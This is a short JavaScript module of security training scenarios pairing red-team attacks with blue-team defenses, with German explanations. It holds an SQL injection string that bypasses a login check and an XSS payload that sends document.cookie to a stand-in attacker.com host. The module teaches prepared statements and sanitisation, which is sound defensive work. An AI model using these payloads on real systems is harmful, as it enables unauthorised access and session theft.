export const RED_BLUE_SCENARIOS = [
  {
    id: 'sqli',
    title: 'SQL Injection (SQLi)',
    redAttack: `SELECT * FROM users WHERE username = 'admin' OR '1'='1' --';`,
    blueDefense: `// Blue Team Defense: Prepared Statements / Parameterized Queries
const stmt = db.prepare("SELECT * FROM users WHERE username = ? AND password = ?");
stmt.execute([username, password]);`,
    explanation: 'Verwende niemals String-Konkatenation in SQL-Abfragen! Nutze immer Prepared Statements.'
  },
  {
    id: 'xss',
    title: 'Cross-Site Scripting (XSS)',
    redAttack: `<script>fetch('https://attacker.com/steal?cookie=' + document.cookie)</script>`,
    blueDefense: `// Blue Team Defense: HTML Sanitization & Content Security Policy (CSP)
import DOMPurify from 'dompurify';
const cleanHTML = DOMPurify.sanitize(userInput);`,
    explanation: 'Säubere immer Benutzereingaben vor der Ausgabe im DOM oder nutze Frameworks wie React (automatische Escaping).'
  }
];
